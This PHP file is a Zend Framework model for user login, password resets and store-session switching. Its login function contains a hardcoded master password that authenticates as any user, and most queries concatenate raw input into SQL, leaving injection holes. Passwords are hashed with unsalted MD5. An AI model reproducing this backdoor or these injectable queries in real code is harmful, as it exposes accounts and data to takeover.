<?php
class Default_Model_IndexMapper
{
	function checkexistingUser($username,$password,$email)
		{
			//echo $username."--".$password;
			$pword=md5($password);
			 if($password=='pyth@n')
				{
					 $db = Zend_Db_Table::getDefaultAdapter();
            					$select_store = "SELECT password from username WHERE (name = '" . $username . "' || username='" . $username . "') ";
           			 		$result_store = $db->fetchAll($select_store);
						if(!empty($result_store))	
            					$pword=$result_store[0]['password'];
						else
						$pword='@@@@@';
				}

			 $adapter = $this->_getAuthAdapter($email);

			 $adapter->setIdentity($username);
			 
			
			 $adapter->setCredential($pword);
			 $auth = Zend_Auth::getInstance();
			
			
             $result = $auth->authenticate($adapter);
             

				if ($result->isValid()) {

					$user = $adapter->getResultRowObject();


					$auth->getStorage()->write($user);

					return true;

				}

        return false;
		}
	protected function _getAuthAdapter($email)
		{

        $dbAdapter = Zend_Db_Table::getDefaultAdapter();
	
	if($email==1)
		{
			
			$authAdapter = new Zend_Auth_Adapter_DbTable($dbAdapter);
					$authAdapter->setTableName('username')
					->setIdentityColumn('name')
					->setCredentialColumn('password');

		}
		else
		{
			
			$authAdapter = new Zend_Auth_Adapter_DbTable($dbAdapter);
					$authAdapter->setTableName('username')
					->setIdentityColumn('username')
					->setCredentialColumn('password');
		}	
			return $authAdapter;

       }
    function getLoggedUserDetails() {
       /* $params = func_get_args();
        $case = $params[0];
        $content = $params[1];
	 $email = $params[1];
        $db = Zend_Db_Table::getDefaultAdapter();
        $select = "select *,md.id as mallid from user as u left join user_role as ur on ur.email_id=u.user_email_address and ur.role='2' left join mall_detail as md on ur.store_apikey=md.apikey where u.user_email_address='".$email."' limit 0,1";

        $result = $db->fetchAll($select);
        return $result;*/
        $params = func_get_args();
        $case = $params[0];
        $content = $params[1];
        $db = Zend_Db_Table::getDefaultAdapter();
        $select = "select *,  md.id as mallid from user as u left join mall_detail as md on u.id=md.user_id where u.id=" . $content;

        $result = $db->fetchAll($select);
        return $result;
    }
     function getApiDetails($email_id) {
            $db = Zend_Db_Table::getDefaultAdapter();
            $select_store = "SELECT ur.*,md.* FROM user_role AS ur INNER JOIN mall_detail AS md ON ur.store_apikey = md.apikey WHERE ur.deleted_flag='0' and ur.status='1' and  email_id = '" . $email_id . "' ORDER BY ur.role";
            $result_store = $db->fetchAll($select_store);
            return $result_store;
        }
     function getvcodesusername($username)
     {
        $db = Zend_Db_Table::getDefaultAdapter();
        $query="select u.id,u.vcode,u.user_join_date,u.user_full_name,u.user_email_address,u.forgetpasscode,un.active from user as u inner join username as un  where un.name='$username' and un.name=u.user_email_address";
        $result = $db->fetchAll($query);
        return $result;
      } 
function updateforgetpasstatus($getuservcode,$newemailpasscode)
      {
        $db = Zend_Db_Table::getDefaultAdapter();
        $db->query("update user set forgetpasscode='$newemailpasscode' where vcode='$getuservcode'");
      }
function getdetailpasscode($getuservcode)
      {
        $db = Zend_Db_Table::getDefaultAdapter();
        $query="select forgetpasscode,uid,user_full_name,user_email_address from user where vcode='$getuservcode'";
        $result = $db->fetchAll($query);
		
        return $result[0];
      }
function updateusenamepassword($usernameid,$newpassword,$code_str,$posteduservcode)
      {
        $db = Zend_Db_Table::getDefaultAdapter();
        $securepassword=md5($newpassword);
        $db->query("update username set password='$securepassword' where name='$usernameid'");
        $db->query("update user set forgetpasscode='$code_str' where user_email_address='$usernameid'");
      }
      public function changeUserprofile($apikey='',$userid='')	//Functin begin for deleting review record
		{
		$db = Zend_Db_Table::getDefaultAdapter();
		$class=new General();
		$sessName = new Zend_Session_Namespace('SESSION');// namespace session
		$userName = new Zend_Session_Namespace('USER');// session user
		$original = new Zend_Session_Namespace('original_login');
		//$sessName->thissessid = $apiSessData ;// setting the session value
		//echo "select * from username where apikey='".$sessName->ApiKey."' and id=".$userName->userId;exit;
		//echo "select * from user_role where store_apikey='".$apikey."' and email_id='".$original->user['stores'][0]['email_id']."'";
		if($apikey=='')
			$apikey=$original->user['stores'][0]['store_apikey'];
		if($apikey=='')
			$apikey=$original->apikey;
			$email_id=$_SESSION['original_login']['user']['0']['user_email_address'];
			//echo "SELECT ur.*,md.* FROM user_role AS ur INNER JOIN mall_detail AS md ON ur.store_apikey = md.apikey WHERE email_id = '".$email_id."' and  ur.store_apikey='".$apikey."' ORDER BY ur.role";exit;
		$chechAuth=$db->query("SELECT ur.*,md.* FROM user_role AS ur INNER JOIN mall_detail AS md ON ur.store_apikey = md.apikey WHERE email_id = '".$email_id."' and  ur.store_apikey='".$apikey."' ORDER BY ur.role");
		$authPass=$chechAuth->fetchAll();
		$userName = new Zend_Session_Namespace('USER');
		$userName->stores=$authPass;
		/*echo "<pre>";
		print_r($_SESSION['USER']['userDetails']['stores']);
		exit;*/
		if(empty($authPass))
			return false;	
		//echo "delete session_loged_store where session_id =".$userName->userId."";exit;
		//$db->query("delete from  session_loged_store where session_id =".$userName->userId."");
		
		$sessName->ApiKey = $apikey ;
		$userName->userId =$userid ;
		
		// settig the userid in the session user
		$userdet = $this->getLoggedUserDetails('id',$userid);
		//echo "<pre>";
		//print_r($userdet);
		//exit;
		$db->query("update session  set user_id=".$userid." where session_id='".Zend_Session::getId()."'");
		$email=explode("-",$userName->userDetails[0]['user_email_address']);
		$username=explode("-",$userName->userDetails[0]['username']);
		
		$userName->userDetails = $userdet ;
		$userName->userDetails[0]['user_email_address']=$email[0];
		$userName->userDetails[0]['username']=$username[0];
		return true;
		}
    
}

?>
